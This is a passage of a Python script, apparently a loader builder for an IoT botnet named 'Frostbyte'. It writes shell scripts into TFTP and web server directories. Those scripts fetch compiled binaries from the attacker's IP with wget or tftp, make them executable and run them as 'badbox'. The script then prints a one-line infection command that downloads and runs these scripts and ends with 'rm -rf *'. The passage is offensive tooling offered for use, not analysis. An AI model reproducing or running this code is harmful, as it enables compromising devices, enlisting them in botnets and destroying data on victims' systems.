...
run('echo -e "#!/bin/bash" > /var/lib/tftpboot/'+dirname+'/'+prefix+'1.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/'+dirname+'/'+prefix+'1.sh')
run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/'+dirname+'/'+prefix+'1.sh')
run('echo -e "#!/bin/bash" > /var/lib/tftpboot/'+dirname+'/'+prefix+'2.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/'+dirname+'/'+prefix+'2.sh')
run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/'+dirname+'/'+prefix+'2.sh')
run('echo -e "#!/bin/bash" > /var/www/html/'+dirname+'/'+prefix+'S.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ip+'/'+dirname+'/'+i+'; chmod +x '+i+'; ./'+i+'; rm -rf '+i+'" >> /var/www/html/'+dirname+'/'+prefix+'S.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp '+ip+' -c get '+dirname+'/'+i+'; cat '+i+' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/'+dirname+'/'+prefix+'1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+dirname+'/'+i+' -g '+ip+'; cat '+i+' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/'+dirname+'/'+prefix+'2.sh')
...
print "Thank You For Using Frostbyte Your payload is: cd /tmp || cd /run || cd /; wget http://"+ip+"/"+dirname+"/"+prefix+"S.sh; chmod 777 "+prefix+"S.sh; sh "+prefix+"S.sh; tftp "+ip+" -c get "+prefix+"1.sh; chmod 777 "+prefix+"1.sh; sh "+prefix+"1.sh; tftp -r "+prefix+"2.sh -g "+ip+"; chmod 777 "+prefix+"2.sh; sh "+prefix+"2.sh; rm -rf "+prefix+"S.sh "+prefix+"1.sh "+prefix+"2.sh; rm -rf *"
